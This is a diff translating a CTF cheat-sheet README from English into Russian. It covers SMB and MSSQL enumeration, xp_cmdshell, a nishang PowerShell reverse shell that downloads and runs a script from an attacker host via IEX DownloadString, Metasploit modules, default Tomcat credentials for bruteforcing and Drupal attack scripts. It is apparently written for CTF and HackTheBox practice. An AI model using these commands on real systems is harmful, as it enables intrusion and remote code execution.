@@ -6,57 +6,53 @@ CTF-Katana
 --------------------------
 
 
-This repository, at the time of writing, will just host a listing of tools and commands that may help with CTF challenges. I hope to keep it as a "live document," and ideally it will not die out like the old "tools" page I had made ([https://github.com/USCGA/tools](https://github.com/USCGA/tools)).
+Этот репозиторий, на момент написания, просто содержит список команд и программ, которые помогут в решении заданий на CTF. Я постараюсь поддерживать его, и в идеале он не умрет, как другие мои похожие репозитории <прим. пер.: он умер> ([https://github.com/USCGA/tools](https://github.com/USCGA/tools)).
 
-**The formal tool that automates some of this low-hanging fruit checking is
-finally released. Katana is available at [https://github.com/JohnHammond/katana](https://github.com/JohnHammond/katana).** Pull-requests and contributions
-are welcome!
+**Формальный инструмент, который автоматизирует решение простых задач выпущен. Katana доступна в репозитории [https://github.com/JohnHammond/katana](https://github.com/JohnHammond/katana).** Пулл-реквесты и контрибуция приветствуются!
 
 ---------------
-# Table of Contents
+# Содержание
 
-1. [Post-Exploitation](#post-exploitation)
-2. [Port Enumeration](#port-enumeration)
+1. [Пост-эксплуатация](#post-exploitation)
+2. [Сканирование портов](#port-enumeration)
 3. [445 (smb/Samba)](#445-smbsamba)
-4. [1433 (Microsoft SQL Server)](#1433-microsoft-sql-server)
+4. [1433 (Microsoft SQL Сервер)](#1433-microsoft-sql-server)
 5. [SNMP](#snmp)
-6. [Microsoft Office Macros](#microsoft-office-macros)
-7. [Retrieving Network Service Hashes](#retrieving-network-service-hashes)
-8. [Windows Reverse Shells](#windows-reverse-shells)
-9. [Known Exploits](#known-exploits)
+6. [Макросы в Microsoft Office](#microsoft-office-macros)
+7. [Получение хэшей Сетевых Служб](#retrieving-network-service-hashes)
+8. [Обратный Шелл для Windows](#windows-reverse-shells)
+9. [Известные Эксплоиты](#known-exploits)
 10. [Excess](#excess)
-11. [Esoteric Languages](#esoteric-languages)
-13. [Steganography](#steganography)
-14. [Cryptography](#cryptography)
-15. [Networking](#networking)
+11. [Эзотерические Языки Программирования](#esoteric-languages)
+13. [Стеганография](#steganography)
+14. [Криптография](#cryptography)
+15. [Работа с сетью](#networking)
 16. [PHP](#php)
-17. [PDF Files](#pdf-files)
-18. [Forensics](#forensics)
-19. [PNG File Forensics](#png-file-forensics)
-20. [APK Forensics](#apk-forensics)
-21. [Web](#web)
-22. [Reverse Engineering](#reverse-engineering)
+17. [PDF Файлы](#pdf-files)
+18. [Форензика](#forensics)
+19. [PNG Форензика](#png-file-forensics)
+20. [APK Форензика](#apk-forensics)
+21. [Веб](#web)
+22. [Реверс-Инжинеринг](#reverse-engineering)
 23. [PowerShell](#powerShell)
-24. [Windows Executables](#windows-executables)
-25. [Python Reversing](#python-reversing)
+24. [Исполняемые Файлы Windows](#windows-executables)
+25. [Python Реверс](#python-reversing)
 26. [Binary Exploitation/pwn](#binary-exploitationpwn)
-27. [VisualBasicScript Reversing](#visualbasicscript-reversing)
-28. [Miscellaneous](#miscellaneous)
+27. [VisualBasicScript Реверс](#visualbasicscript-reversing)
+28. [Misc / Не входящее в другие категории](#miscellaneous)
 29. [Jail Breaks](#jail-breaks)
-30. [Trivia](#trivia)
+30. [Тривиальное](#trivia)
 
 ---------------
 
 Post-Exploitation
 ====================
 
-* [static-binaries]
+* [static-binaries](https://github.com/andrew-d/static-binaries)
 
-	If you need to use a program that is not on the box you just broke into, try and build a static binary! I've seen this used on Fatty for HackTheBox, getting a `pty` with the typical `python -c 'import pty...'` trick when it didn't have Python originally!
+	Если вам нужна программа, которой нет на машине, на которую вы только что попали, попробуйте собрать исполняемый файл сами! Я использовал это в Fatty с HackTheBox, получая `pty` с помощью обычного `python -c 'import pty...'`, когда на машине не было изначально питона.
 
-	https://github.com/andrew-d/static-binaries
-
-Port Enumeration
+Сканирование портов
 ====================
 
 
@@ -65,27 +61,27 @@ Port Enumeration
 
 * [`smbmap`](https://github.com/ShawnDEvans/smbmap)
 
-	`smbmap` tells you permissions and access, which `smbclient` does _not_ do!
+	`smbmap` расскажет вам к чему у вас есть доступ, когда `smbclient` этого _НЕ_ делает!
 
-	To try and list shares as the anonymous user **DO THIS** (this doesn't always work for some weird reason)
+	Чтобы вывести список доступного из под анонимного юзера **СДЕЛАЙТЕ ЭТО** (но это не всегда работает, по какой то странной причине)
 
 ```
 smbmap -H 10.10.10.125 -u anonymous
 ```
 
-Or you can attempt just:
+Или вы можете просто:
 
 ```
 smbmap -H 10.10.10.125
 ```
 
-And you can specify a domain like so:
+Указать домен можно так:
 
 ```
 smbmap -H 10.10.10.125 -u anonymous -d HTB.LOCAL
 ```
 
-Worth trying `localhost` as a domain, if that gets "NO_LOGON_SERVERS"
+Стоит попробовать `localhost` как домен, если это выдаст "NO_LOGON_SERVERS"
 
 ```
 smbmap -H 10.10.10.125 -u anonymous -d localhost
@@ -100,46 +96,46 @@ enum4linux 10.10.10.125
 
 * `smbclient`
 
-	**NOTE: DEPENDING ON THE VERSION OF SMBCLIENT YOU ARE USING, you may need to SPECIFY the use of S<B version 1 or SMB version 2. You can dp this with `-m SMB2`. Older versions of SMBclient (latest being 4.10 at the time of writing) use SMB1 _by default_.**
+	**ВНИМАНИЕ: ВЗАВИСИМОСТИ ОТ ВЕРСИИ `SMBCLIENT` КОТОРУЮ ВЫ ИСПОЛЬЗУЕТЕ, вам возможно придется указать использование S<B версии 1 или SMB версии 2. Вы можете указать версию с помощью `-m SMB2`. Старые версии SMBclient (Последняя 4.10 на момент написания) использует SMB1 _по умолчанию_.**
 
-	You can use `smbclient` to look through files shared with SMB. To _list_ available shares:
+	Вы можете использовать `smbclient` чтобы увидеть файлы, расшаренные SMB. Чтобы _вывести_ доступные шейры:
 
 ```
 smbclient -m SMB2 -N -L //10.10.10.125/
 ```
 
-Once you find a share you want to/can access, you can connect to shares by using the name following the locator:
+Как только вы найдете шейр который вам нужен / есть доступ, вы можете подключиться к шейрам, дописав имя после адреса:
 
 ```
-smbclient -m SMB2 -N //10.10.10.125/Reports
+smbclient -m SMB2 -N //10.10.10.125/Отчеты
 ```
 
-You will see a `smb: \>` prompt, and you can use `ls` and `get` to retrieve files or even `put` if you need to place files there.
+Вы увидите `smb: \>` шелл, и сможете использовать `ls` и `get` чтобы получить файлы или даже `put`, если захотите что то загрузить.
 
-1433 (Microsoft SQL Server)
+1433 (Microsoft SQL Сервер)
 ------------------------------
 
 * `impacket` -> `mssqlclient.py`
 
-	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:
+	Вы можете подключиться к Microsoft SQL Серверу, используя `myssqlclient.py`, при этом зная логин и пароль, таким образом:
 
 ```
 mssqlclient.py username@10.10.10.125
 ```
 
-It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**
+Скрипт запросит у вас пароль. **Если пароль не подходит, но вы уверены в пароле, сервер возможно использует "Windows authentication", которую вы можете использовать так:**
 
 ```
 mssqlclient.py username@10.10.10.125 -windows-auth
 ```
 
-If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:
+Если у вас уже есть доступ к Micosoft SQL Серверу, вы можете попробовать `enable_xp_cmdshell` для исполнения команд. С `mssqlclient.py` можете попробовать:
 
 ```
 SQL> enable_xp_cmdshell
 ```
 
-though, you may not have permission. If that DOES succeed, you can now run commands like:
+Но, вам может не хватить прав. Если же вам их хватит, вы сможете запускать команды так:
 
 ```
 SQL> xp_cmdshell whoami
@@ -155,18 +151,18 @@ snmp-check 10.10.10.125
 ```
 
 
-Microsoft Office Macros
+Макросы в Microsoft Office
 ---------------
 
 * [`oletools`](https://github.com/decalage2/oletools) -> `olevba`
 
-	`olevba` can look for Macros within office documents (which you should always check) with just supplying the filename:
+	`olevba` сканирует офисные файлы в поисках макросов (а их всегда стоит смотреть), просто предоставьте ему название файла:
 
 ```
 olevba "Currency Volume Report.xlsm"
 ```
 
-Retrieving Network Service Hashes
+Получение хэшей Сетевых Служб
 ----------------------------------
 
 
@@ -178,94 +174,93 @@ Retrieving Network Service Hashes
 ```
 
 
-Windows Reverse Shells
+Обратный Шелл для Windows
 ---------------------------
 
 
 * [Nishang][nishang]
 
-	If you have access to PowerShell,  you can get a Reverse shell by using [nishang]'s `Invoke-PowerShellTcp.ps1` script inside of the `Shells` directory. Be sure to add the function call example to the bottom of your script, so all you need to to do to host it is (on your Attacker machine):
+	Если у вас есть доступ к PowerShell, вы можете получить обратный шелл, используя  `Invoke-PowerShellTcp.ps1` [nishang]'а из папки `Shells`. Не забудьте добавить вызов функции в конце вашего скрипта, так что все что вам нужно будет сделать на хосте (на вашей, атакующей машине):
 
 ```
 python -m SimpleHTTPServer
 ```
 
-and then on the victim machine:
+и на машине-жертве:
 
 ```
 powershell IEX( New-Object Net.WebClient).DownloadString("http://10.10.14.6:8000/reverse.ps1") )
 ```
 
-Also, if you want to have nice up and down arrow key usage within your Windows reverse shell, you can use the utility `rlwrap` before your netcat listener command.
+Кстати, если вы хотите использовать стрелочки вверх и вниз в ревшелле, можете вызвать утиллиту `rlwrap` перед командой netcat, которой вы ловите шелл.
 
 ```
 rlwrap nc -lnvp 9001
 ```
 
 
-Known Exploits
+Известные эксплоиты
 ------------------
 
 * Java RMI
 
-	Metasploit module: `exploit/multi/misc/java_rmi_server`
+	Модуль в Metasploit: `exploit/multi/misc/java_rmi_server`
 
-	When testing this, responses are _known to come back with an error or exception_. Your code MAY VERY WELL still be executing. Try and run commands that include a callback. And _use Python_ to live off the land and try avoid special characters, like `|` pipes! [ysoserial](https://github.com/frohoff/ysoserial) is a good tool for deserializing Java code to take advantage of this vulnerability.
+	Когда тестируете это, ответы _могут приходить с ошибками или эксепшионами_. Ваш код может все еще выполнятся. Попробуйте запускать команды, которые что то возвращают. И _используйте Python_, старайтесь избегать спец. символов, вроде `|` пайпов! [ysoserial](https://github.com/frohoff/ysoserial) хорошая тулза для десереализации Java кода, чтобы воспользоваться этой уязвимостью.
 
 * Heartbleed
 
-	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`
+	Модуль в Metasploit: `auxiliary/scanner/ssl/openssl_heartbleed`
 
-	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.
+	Не забудьте установить `set VERBOSE true` чтобы увидеть полученный результат. Он может содержать флаг или другую полезную информацию.
 
 * libssh - SSH
 
-	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)
+	`libssh0.8.1` (и другие версии??) уязвимы для быстрого допуска в ssh. 
+	Модуль в Metasploit: `auxiliary/scanner/ssh/libssh_auth_bypass`. Не забудьте установить `set spawn_pty true`, чтобы получить шелл! И `sessions -i 1` чтобы взаимодействовать с полученным шеллом (или какой нибудь другой ID)
 
-* Bruteforcing RDP
+* Брутфорс RDP
 
-	Bruteforcing RDP with `hydra` or `ncrack` is __NOT ALWAYS ADVISABLE__ because of Cred-SSB. An option _might_ be to script xrdp to automate against a password or word list... __but THIS IS NOT TESTED__.
+	Брутфорс RDP с `hydra` или `ncrack` __НЕ РЕКОМЕНДУЕТСЯ__ из-за Cred-SSB. Вариантом _может_ быть скрипт xrdp чтобы автоматизировать перебор... __но ЭТО НЕ ТЕСТИРОВАЛОСЬ__.
 
 * Apache Tomcat
 
-	If you can determine that you are working with an Apache Tomcat server (usually by visiting pages that do not exist and seeing a 404 error message), try to visit `/Manager`, which is usually accessible on Tomcat. Possible credentials could be `tomcat:tomcat`, `tomcat:s3cr3t`, `admin:s3cr3t`, `root:s3cr3t`, etc. etc.. Worthy of bruteforcing with `hydra`.
+	Если вы определили, что работаете с Apache Tomcat сервером (обычно посетив страницу, которой нет и увидев 404), попробуйте перейти в `/Manager`, который обычно доступен в Tomcat. Возможные логин:пароль могут быть `tomcat:tomcat`, `tomcat:s3cr3t`, `admin:s3cr3t`, `root:s3cr3t`, и т. д. и т. п.. Стоит попробовать брутфорснуть c помощью `hydra`.
 
-	If you see URLs are appended with a `.action` (not a `.do`), you may be working with Apache Struts.
-
-* Apache Struts
-
-	To identify the Apache Struts version is running,
+	Если вы видите юрл с `.action` (не `.do`), возможно вы работаете с Apache Struts.
 
 Excess
 --------
 
 * [wifite2](https://github.com/derv82/wifite2)
 
-	Brute-force a Wi-Fi access point.
+	Буртфорс Wi-Fi точки доступа.
 
 * [impacket](https://github.com/SecureAuthCorp/impacket)
 
-	Tool to quickly spin up a Samba share.
+	Тулза чтобы бысто поднять самбу.
 
 * [enum4linux](https://github.com/portcullislabs/enum4linux)
 
-	Script to scan Windows Samba shares. VERY GOOD TO RUN FOR WINDOWS ENUMERATION.
+	Скрипт для сканирования Windows Samba шейров. ОЧЕНЬ ХОРОШ ДЛЯ ИССЛЕДОВАНИЯ WINDOWS.
 
 * [drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)
 
-	Attack script for old or outdated Drupal servers. Usually very effective.
+	Скрипт для атаки на старые Drupal сервера. Обычно очень эфективен.
 
-Esoteric Languages
+Эзотерические Языки Программирования
 -----------------------
 
 
 * [Try It Online](https://tio.run/)
 
-	An online tool that has a ton of Esoteric language interpreters.
+	Сайт, содержащий тонну разных интерпритаторов.
 
 * [Brainfuck](https://esolangs.org/wiki/brainfuck)
 
-	This language is easily detectable by its huge use of plus signs, braces, and arrows. 	There are plenty of online interpreters, like this one: [https://copy.sh/brainfuck/](https://copy.sh/brainfuck/) Some example code:
+	Этот язык очешь легко определить по большому количеству плюсов, стрекочек, тире и т. д..
+	В сети куча интерпритаторов, мне нравится этот: [https://copy.sh/brainfuck/](https://copy.sh/brainfuck/) 
+	Пример кода:
 
 ```
 ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.--.--------------.+++++++++++++.----.-----------
@@ -276,7 +271,9 @@ Esoteric Languages
 
 * [COW](https://esolangs.org/wiki/COW)
 
-	This language is easily identified by numerous "MOO" statements and random capitalization. It has an option on [https://tio.run/](https://tio.run/) Some example code:
+	Язык можно определить по большому количеству "MOO"и разных форм этого слова. 
+	Можно запустить на [https://tio.run/](https://tio.run/)
+	Пример кода:
 
 ```
  MoO moO MoO mOo MOO OOM MMM moO moO
@@ -286,7 +283,9 @@ Esoteric Languages
 
 * [Malboge](https://esolangs.org/wiki/malbolge)
 
-	An esoteric language that looks a lot like Base85... but isn't. Often has references to "Inferno" or "Hell" or "Dante." Online interpreters like so: [http://www.malbolge.doleczek.pl/](http://www.malbolge.doleczek.pl/) Some example code:
+	Эзотерический язык, выглятит как Base85... но, нет. 
+	Онлайн интерпритатор: [http://www.malbolge.doleczek.pl/](http://www.malbolge.doleczek.pl/) 
+	Пример кода:
 
 ```
 (=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
@@ -294,13 +293,14 @@ Esoteric Languages
 
 * [Piet](https://esolangs.org/wiki/piet)
 
-	A graphical programming language... looks like large 8-bit pixels in a variety of colors. Can be interpreted with the tool [`npiet`][npiet]
+	Графический ЯП... Выглядит как большие 8-битные пиксели разных цветов. можно запустить с помощью [`npiet`][npiet]
 
 ![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)
 
 * [Ook!](http://esolangs.org/wiki/ook!)
 
-	A joke language. Recognizable by `.` and `?`, and `!`. Online interpreter for this language: [https://www.dcode.fr/ook-language](https://www.dcode.fr/ook-language) Some example code:
+	Рофлоязык. Узнаваем по `.` и `?`, и `!`. Онлайн интерпритатор: [https://www.dcode.fr/ook-language](https://www.dcode.fr/ook-language) 
+	Пример кода:
 
 ```
 Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
